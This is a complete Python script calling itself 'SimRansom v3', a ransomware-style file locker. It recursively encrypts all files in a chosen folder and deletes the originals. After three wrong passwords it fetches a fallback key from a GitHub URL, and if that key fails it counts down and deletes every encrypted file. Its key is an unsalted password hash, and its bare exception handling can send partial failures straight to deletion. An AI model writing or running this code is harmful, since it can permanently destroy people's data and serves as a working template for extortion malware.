#!/data/data/com.termux/files/usr/bin/python3

#!/usr/bin/env python3
import os
import time
import base64
import hashlib
import json
import requests
from cryptography.fernet import Fernet
from getpass import getpass
from colorama import Fore, init
from datetime import datetime

init(autoreset=True)

MAX_ATTEMPTS = 3
REMOTE_KEY_URL = "https://raw.githubusercontent.com/sunnamsriram1/unlock-key/main/key.json"

def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

def encrypt_file(path, fernet):
    with open(path, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(path + ".locked", "wb") as file:
        file.write(encrypted)
    os.remove(path)
    print(Fore.GREEN + "[✓] Encrypted:", path)

def decrypt_file(path, fernet):
    with open(path, "rb") as file:
        data = file.read()
    decrypted = fernet.decrypt(data)
    original_path = path.replace(".locked", "")
    with open(original_path, "wb") as file:
        file.write(decrypted)
    os.remove(path)
    print(Fore.YELLOW + "[✓] Decrypted:", original_path)

def fetch_remote_key():
    try:
        res = requests.get(REMOTE_KEY_URL, timeout=10)
        data = res.json()
        return data.get("remote_key")
    except:
        return None

def countdown(seconds):
    print(Fore.RED + f"\n☠️  Initiating self-destruct in {seconds} seconds...")
    while seconds:
        print(Fore.LIGHTRED_EX + f"⏳ {seconds}...", end="\r")
        time.sleep(1)
        seconds -= 1
    print()

def process_folder(folder, mode, fernet):
    count = 0
    for root, dirs, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            if mode == "lock" and not path.endswith(".locked"):
                encrypt_file(path, fernet)
                count += 1
            elif mode == "unlock" and path.endswith(".locked"):
                decrypt_file(path, fernet)
                count += 1
    print(Fore.CYAN + f"\n✅ Total files processed: {count}")

def self_destruct(folder):
    countdown(10)
    for root, dirs, files in os.walk(folder):
        for name in files:
            if name.endswith(".locked"):
                path = os.path.join(root, name)
                os.remove(path)
                print(Fore.RED + "Deleted:", name)
    print(Fore.RED + "\n☠️  All encrypted files destroyed.")

def main():
    print(Fore.CYAN + "\n🔐 SimRansom v3 — Remote Unlock File Locker")
    mode = input(Fore.YELLOW + "🔄 Mode (lock/unlock): ").strip().lower()
    if mode not in ["lock", "unlock"]:
        print(Fore.RED + "Invalid mode!")
        return

    folder = input(Fore.CYAN + "📁 Enter target folder path: ").strip()
    if not os.path.exists(folder):
        print(Fore.RED + "❌ Folder not found!")
        return

    password = getpass("🔑 Enter password: ")
    fernet = generate_key(password)

    if mode == "lock":
        print(Fore.YELLOW + f"⚙️ Processing '{folder}' in lock mode...")
        process_folder(folder, "lock", fernet)

    elif mode == "unlock":
        attempts = 0
        while attempts < MAX_ATTEMPTS:
            try:
                process_folder(folder, "unlock", fernet)
                print(Fore.GREEN + "✅ Unlocked with correct password!")
                return
            except:
                attempts += 1
                print(Fore.RED + f"[X] Wrong password! ({attempts}/{MAX_ATTEMPTS})")
                if attempts < MAX_ATTEMPTS:
                    password = getpass("🔑 Enter password: ")
                    fernet = generate_key(password)

        print(Fore.RED + "\n💣 Too many wrong attempts!")

        # Remote unlock try
        print(Fore.YELLOW + "\n🌐 Checking remote unlock key...")
        remote_key = fetch_remote_key()
        if remote_key:
            print(Fore.BLUE + "🔐 Remote key found. Trying unlock...")
            fernet = generate_key(remote_key)
            try:
                process_folder(folder, "unlock", fernet)
                print(Fore.GREEN + "✅ Remote key matched. Files restored.")
                return
            except:
                print(Fore.RED + "❌ Remote key failed.")
        else:
            print(Fore.RED + "❌ Could not fetch remote key.")

        self_destruct(folder)

if __name__ == "__main__":
    main()
